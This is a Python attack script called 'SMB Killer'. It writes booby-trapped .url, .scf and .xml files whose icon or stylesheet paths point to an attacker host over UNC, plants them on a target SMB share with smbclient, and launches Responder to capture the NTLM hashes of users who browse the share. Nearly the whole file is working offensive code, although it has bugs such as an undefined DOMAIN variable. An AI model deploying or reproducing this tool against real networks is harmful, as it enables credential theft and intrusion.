#!/usr/bin/env python3 

import os
import argparse
import sys
import time
try:
    from colorama import Fore
except ImportError:
    os.system("pip3 install colorama")
    os.system("pip install colorama")

RED = Fore.RED
YELLOW = Fore.YELLOW
GREEN = Fore.GREEN
MAGENTA = Fore.MAGENTA
BLUE = Fore.BLUE
RESET = Fore.RESET



print(RED+    " _____ _____  _____     ________  _________     _   _______ _      _      ___________ ")
print(YELLOW+ "|  _  |  __ \/  __ \   /  ___|  \/  || ___ \   | | / /_   _| |    | |    |  ___| ___ \\")
print(GREEN+  "| | | | |  \/| /  \/   \ `--.| .  . || |_/ /   | |/ /  | | | |    | |    | |__ | |_/ /")
print(MAGENTA+"| | | | | __ | |        `--. \ |\/| || ___ \   |    \  | | | |    | |    |  __||    / ")
print(BLUE+   "\ \_/ / |_\ \| \__/\   /\__/ / |  | || |_/ /   | |\  \_| |_| |____| |____| |___| |\ \ ")
print(RED+    " \___/ \____/ \____/   \____/\_|  |_/\____/    \_| \_/\___/\_____/\_____/\____/\_| \_|")
print(YELLOW+ "                                                                                      "+RESET)
                                                                                      



parser = argparse.ArgumentParser(description="SMB Killer",
formatter_class=argparse.ArgumentDefaultsHelpFormatter)

parser = argparse.ArgumentParser(description="SMB Killer", formatter_class=argparse.ArgumentDefaultsHelpFormatter)
parser.add_argument("-r", "--RHOST", action="store", help="RHOST")
parser.add_argument("-l", "--LHOST", action="store", help="LHOST")
parser.add_argument("-i", "--Interface", action="store", help="LPORT")
parser.add_argument("-a", "--Share", action="store", help="Share Name")
parser.add_argument("-U", "--Username", action="store", help="Username")
parser.add_argument("-P", "--Password", action="store", help="Password")
parser.add_argument("-u", "--url", action="store_true", help="URL File")
parser.add_argument("-s", "--scf", action="store_true", help="SCF File")
parser.add_argument("-x", "--xml", action="store_true", help="XML File")
parser.add_argument("-A", "--All", action="store_true", help="Send up all files (URL, SCF and XML)")
args = parser.parse_args()

RHOST = args.RHOST
LHOST = args.LHOST
INTERFACE = args.Interface
SHARE = args.Share
USERNAME = args.Username
PASSWORD = args.Password
URL = args.url
SCF = args.scf
XML = args.xml
ALL = args.All

parser.parse_args(args=None if sys.argv[1:] else ['--help'])

if (SCF == None and URL == None and XML == None and ALL == None):
    print(YELLOW+"What do you want from me!!!"+RESET)
    parser.print_help()
    sys.exit()

if (USERNAME != None and PASSWORD == None):
	print(RED+"Need password if utilizing a username"+RESET)

def url():
	print(YELLOW+"Making @evil.url \n"+RESET)
	f = open("@evil.url", "w")
	template = f"""[InternetShortcut]\n
URL=whatever\n
WorkingDirectory=whatever\n
IconFile=\\\\"""+LHOST+"""\\%USERNAME%.icon\n
IconIndex=1"""
	f.write(template)
	time.sleep(1)
	print(GREEN+"Putting file into smb server, responder will automatically start \n"+RESET)

def scf():
	print(YELLOW+"Making @evil.scf \n"+RESET)
	f = open("@evil.scf", "w")
	template= f"""[Shell]\n
Command=2\n
IconFile=\\\\"""+LHOST+"""\\tools\\nc.ico\n
[Taskbar]\n
Command=ToggleDesktop"""
	f.write(template)
	print(GREEN+"Putting file into smb server and starting Responder \n "+RESET)
	
def xml():
	print(YELLOW+"Making @evil.xml \n"+RESET)
	f = open("@evil.xml", "w")
	template= f"""("<?xml version='1.0' encoding='UTF-8' standalone='yes'?>\n"
	"<?mso-application progid='Word.Document'?>\n"
	"<?xml-stylesheet type='text/xsl' href='\\\\"""+LHOST+"""\\evil.xsl' ?>")"""
	f.write(template)
	print(GREEN+"Putting file into smb server, once done exit out of SMB Server and responder will automatically start \n"+RESET)
	
def URL_File():
	if (USERNAME != None and PASSWORD != None):
		os.system("""smbclient //"""+RHOST+"""/"""+SHARE+""" -U """+DOMAIN+"""/"""+USERNAME+"""%"""+PASSWORD+""" -c 'put @evil.url'""")
		os.system("""sudo responder -I """+INTERFACE+""" -wv""") 
	else:
		os.system("""smbclient //"""+RHOST+"""/"""+SHARE+""" -c 'put @evil.url'""")
		os.system("""sudo responder -I """+INTERFACE+""" -wv""") 

def SCF_File():
	if (USERNAME != None and PASSWORD != None):
		os.system("""smbclient //"""+RHOST+"""/"""+SHARE+""" -U """+DOMAIN+"""/"""+USERNAME+"""%"""+PASSWORD+""" -c 'put @evil.scf'""")
		os.system("""sudo responder -I """+INTERFACE+""" -wv""") 
	else:
		os.system("""smbclient //"""+RHOST+"""/"""+SHARE+""" -c 'put @evil.scf'""")
		os.system("""sudo responder -I """+INTERFACE+""" -wv""") 

def XML_File():
	if (USERNAME != None and PASSWORD != None):
		os.system("""smbclient //"""+RHOST+"""/"""+SHARE+""" -U """+DOMAIN+"""/"""+USERNAME+"""%"""+PASSWORD+""" -c 'put @evil.xml'""")
		os.system("""sudo responder -I """+INTERFACE+""" -wv""") 
	else:
		os.system("""smbclient //"""+RHOST+"""/"""+SHARE+""" -c 'put @evil.xml'""")
		os.system("""sudo responder -I """+INTERFACE+""" -wv""") 

def ALL():
	if (USERNAME != None and PASSWORD != None):
		os.system("""smbclient //"""+RHOST+"""/"""+SHARE+""" -U """+DOMAIN+"""/"""+USERNAME+"""%"""+PASSWORD+""" -c 'put @evil.xml; put @evil.scf; put @evil.url'""")
		os.system("""sudo responder -I """+INTERFACE+""" -wv""") 
	else:
		os.system("""smbclient //"""+RHOST+"""/"""+SHARE+""" -c 'put @evil.xml; put @evil.url; put @evil.scf'""")
		os.system("""sudo responder -I """+INTERFACE+""" -wv""") 

if args.url == True:
	url()
	URL_File()
if args.scf == True:
	scf()
	SCF_File()
if args.xml == True:
	xml()
	XML_File()
if args.All == True:
	xml()
	url()
	scf()
	ALL()

#Thank you dze64 for all the help while making this, he made it much better but I wanted / needed to learn some python, had a lot of fun making this and learning
